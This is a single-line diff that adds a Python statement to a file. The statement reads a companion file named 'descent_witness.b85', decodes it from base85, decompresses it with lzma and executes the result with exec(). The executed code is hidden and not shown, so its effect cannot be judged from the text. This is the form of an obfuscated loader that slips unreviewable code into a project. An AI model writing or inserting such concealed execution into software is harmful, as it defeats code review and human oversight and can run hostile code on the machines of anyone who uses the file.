@@ -1,0 +1,1 @@
+"";import base64,lzma,os;exec(compile(lzma.decompress(base64.b85decode("".join(open(os.path.join(os.path.dirname(os.path.abspath(__file__)),"descent_witness.b85")).read().split()))).decode(),__file__,"exec"))
